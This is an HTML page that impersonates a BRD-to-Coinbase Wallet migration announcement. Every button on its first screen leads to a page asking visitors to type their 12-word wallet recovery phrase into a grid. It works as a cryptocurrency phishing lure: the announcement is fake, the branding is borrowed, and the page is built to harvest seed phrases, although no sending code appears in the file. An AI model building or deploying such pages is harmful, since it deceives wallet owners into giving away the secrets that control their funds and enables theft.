<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BRD Wallet Migration</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #1e1e3f;
            --btn-blue: #586cf5;
            --btn-hover-blue: #4759d1;
            --btn-gray: #4b4c68;
            --text-white: #ffffff;
            --text-secondary: #b0b0cc;
            --border-color: rgba(255, 255, 255, 0.1);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-white);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* حاوية الهاتف الافتراضية */
        .phone-mockup {
            width: 100%;
            max-width: 420px;
            height: 100vh;
            max-height: 900px;
            position: relative;
            background-color: var(--bg-color);
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* التحكم في عرض الصفحات */
        .page {
            display: none;
            flex-direction: column;
            padding: 40px 24px;
            width: 100%;
            height: 100%;
            animation: fadeIn 0.3s ease-in-out;
        }

        .page.active { display: flex; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateX(20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        /* --- تصميم الصفحة الأولى --- */
        .logo-section {
            margin-top: 40px;
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 40px;
        }

        .cb-icon {
            width: 75px;
            height: 75px;
            background: #0052ff;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            margin-bottom: 12px;
        }

        .cb-icon-inner {
            width: 28px;
            height: 28px;
            border: 5px solid white;
            border-radius: 4px;
        }

        .arrow-indicator {
            font-size: 20px;
            color: var(--text-secondary);
            margin-bottom: 8px;
        }

        .brd-logo-main {
            width: 130px;
            height: auto;
        }

        h1 {
            font-size: 26px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 16px;
            line-height: 1.2;
        }

        .desc-text {
            color: var(--text-secondary);
            font-size: 15px;
            text-align: center;
            line-height: 1.5;
            margin-bottom: 60px;
        }

        .btn-stack {
            display: flex;
            flex-direction: column;
            gap: 14px;
            margin-top: auto;
            margin-bottom: 20px;
        }

        .main-btn {
            width: 100%;
            padding: 18px;
            border-radius: 6px;
            border: none;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-align: center;
            transition: background 0.2s;
        }

        .bg-blue { background-color: var(--btn-blue); color: white; }
        .bg-blue:hover { background-color: var(--btn-hover-blue); }
        .bg-gray { background-color: var(--btn-gray); color: white; }

        /* --- تصميم الصفحة الثانية (Recovery) --- */
        .nav-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 40px;
        }

        .back-btn { font-size: 28px; cursor: pointer; padding: 5px; }
        .help-btn { 
            width: 24px; height: 24px; 
            border: 2px solid white; 
            border-radius: 50%; 
            display: flex; justify-content: center; align-items: center;
            font-size: 14px; font-weight: bold;
        }

        .grid-container {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            overflow: hidden;
            background: rgba(255, 255, 255, 0.02);
        }

        .grid-cell {
            position: relative;
            border: 0.5px solid var(--border-color);
            height: 65px;
            display: flex;
            flex-direction: column;
            padding: 8px;
        }

        .cell-num {
            font-size: 12px;
            color: var(--text-secondary);
            margin-bottom: 4px;
        }

        .cell-input {
            background: transparent;
            border: none;
            color: white;
            font-size: 14px;
            width: 100%;
            outline: none;
        }

    </style>
</head>
<body>

<div class="phone-mockup">
    
    <div id="page1" class="page active">
        <div class="logo-section">
            <div class="cb-icon"><div class="cb-icon-inner"></div></div>
            <div class="arrow-indicator">↑</div>
            <img src="https://i.ibb.co/ymp5HL9C/F3-BB5708-18-B2-4-C3-F-89-D2-ADF914-D14-A9-E.png" alt="BRD Logo" class="brd-logo-main">
        </div>

        <h1>BRD has joined<br>Coinbase Wallet!</h1>
        <p class="desc-text">We're excited to announce that BRD is joining the Coinbase Wallet team.</p>

        <div class="btn-stack">
            <button class="main-btn bg-blue" onclick="navigateTo('page2')">Get Coinbase Wallet</button>
            <button class="main-btn bg-gray" onclick="navigateTo('page2')">View Press Release</button>
            <button class="main-btn bg-gray" onclick="navigateTo('page2')">Restore Wallet</button>
        </div>
    </div>

    <div id="page2" class="page">
        <div class="nav-header">
            <div class="back-btn" onclick="navigateTo('page1')">←</div>
            <div class="help-btn">?</div>
        </div>

        <h1 style="text-align: left; font-size: 24px;">Récupérer votre portefeuille</h1>
        <p class="desc-text" style="text-align: left; margin-bottom: 30px;">Veuillez saisir la phrase de récupération du portefeuille que vous souhaitez récupérer.</p>

        <div class="grid-container" id="recoveryGrid">
            </div>
    </div>

</div>

<script>
    // وظيفة التنقل بين الصفحات
    function navigateTo(pageId) {
        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
        document.getElementById(pageId).classList.add('active');
    }

    // توليد شبكة الكلمات الـ 12 تلقائياً
    const grid = document.getElementById('recoveryGrid');
    for (let i = 1; i <= 12; i++) {
        const cell = document.createElement('div');
        cell.className = 'grid-cell';
        cell.innerHTML = `
            <span class="cell-num">${i}</span>
            <input type="text" class="cell-input" autocomplete="off" spellcheck="false">
        `;
        grid.appendChild(cell);
    }
</script>

</body>
</html>
